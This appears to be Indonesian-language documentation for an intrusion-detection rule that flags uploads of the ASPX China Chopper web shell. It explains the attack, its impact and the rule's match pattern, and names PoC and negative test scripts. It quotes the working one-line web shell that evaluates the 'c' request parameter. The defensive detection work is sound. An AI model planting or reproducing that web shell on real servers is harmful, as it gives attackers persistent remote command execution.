# SID 9190004 — ASPX webshell (China Chopper)

**Rule:** `rules/plaintext/webshell.rules` · **Confidence:** high · **OWASP:** A03 Injection · **Severity:** Critical · **MITRE:** T1505.003 Web Shell

## Serangan apa ini?
Penyerang menaruh (atau mem-POST) sebuah file `.aspx` kecil ke server IIS/.NET.
File itu satu baris "China Chopper": `<%@ Page Language="Jscript"%><%eval(Request.Item["c"],"unsafe");%>`.
Setelah ada di server, penyerang tinggal kirim perintah lewat parameter `c` dan
server mengeksekusinya — pintu belakang permanen.

## Kalau kena, dampaknya?
**Akses shell penuh & persisten** ke server web. Penyerang bisa baca/tulis file,
jalankan perintah, pivot ke jaringan internal — kapan saja, selama webshell-nya
masih ada. Ini tahap *Persistence/Installation* di kill chain.

## Apa yang rule ini deteksi?
Pola `eval(Request.Item[` / `eval(Request[` di **body request** (penyerang
mengunggah/mengirim kode .NET sisi-server). Aplikasi normal tidak pernah mem-POST
kode `eval(Request...)`. Berbeda dari webshell PHP (9190001/9190003) dan JSP (9190002).

## PoC vs Negative
- `poc.sh` → body berisi one-liner China Chopper ASPX → **harus** memicu SID 9190004.
- `negative.sh` → komentar code-review yang menyebut `eval(Request)` tanpa accessor `[`/`(` → kena fast_pattern lalu **ditolak pcre** → TIDAK alert.

## Cara jalanin
```
scripts/rulectl check 9190004
```
Type: single-event.
